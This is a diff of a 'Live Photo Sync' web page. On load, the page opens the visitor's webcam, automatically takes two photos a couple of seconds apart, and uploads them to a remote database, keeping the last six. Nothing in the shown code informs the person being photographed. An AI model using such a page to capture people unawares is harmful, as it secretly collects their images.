@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - 2 Auto Photos Fixed</title>
+  <title>Live Photo Sync - Fixed 2 Auto Shots</title>
   <style>
     body {
       background: black;
@@ -85,17 +85,16 @@
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
 
-      video.onloadeddata = async () => {
-        await delay(500);
-        capturePhoto(); // 1st photo
-        await delay(2000); // wait for 2 seconds
-        capturePhoto(); // 2nd photo
+      video.onloadeddata = () => {
+        // Wait 500ms to ensure video is rendering
+        setTimeout(() => {
+          capturePhoto(); // 1st photo
+          setTimeout(() => {
+            capturePhoto(); // 2nd photo after 2s
+          }, 2000);
+        }, 500);
       };
     });
-
-    function delay(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
 
     function capturePhoto() {
       if (captureCount >= 2) return;
@@ -104,19 +103,17 @@
       captureCount++;
       console.log("Capturing photo", captureCount);
 
-      requestAnimationFrame(() => {
-        const ctx = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const dataUrl = canvas.toDataURL("image/jpeg");
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg");
 
-        db.ref(photoPath).once("value", snapshot => {
-          let photos = snapshot.val() || [];
-          photos.push(dataUrl);
-          if (photos.length > 6) photos = photos.slice(-6); // FIFO
-          db.ref(photoPath).set(photos);
-        });
+      db.ref(photoPath).once("value", snapshot => {
+        let photos = snapshot.val() || [];
+        photos.push(dataUrl);
+        if (photos.length > 6) photos = photos.slice(-6);
+        db.ref(photoPath).set(photos);
       });
     }
 
